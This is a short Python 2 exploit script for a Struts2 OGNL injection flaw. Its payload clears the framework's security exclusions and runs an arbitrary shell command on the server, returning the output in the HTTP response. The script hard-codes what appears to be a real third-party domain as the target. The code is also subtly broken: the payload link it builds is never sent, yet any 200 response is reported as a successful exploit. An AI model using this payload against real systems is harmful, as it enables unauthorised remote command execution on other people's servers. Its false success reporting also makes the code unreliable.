import  requests
import sys
from urllib import quote
import  urllib2


def explot(url, param, command):
    payload = """%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='""" + command + """').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""
    link = "{}/?{}={}".format(url, param, quote(payload))
    res = requests.get(url, timeout=10)
    if res.status_code == 200:
        print "[+]Exploit Finished!"
    else:
        print "[!]Exploit Failed!"



if __name__ == '__main__':

    url = "http://www.paypalm.cn"
    param = "username"
    command = "touch /tmp/payploadbak"

    explot(url, param, command)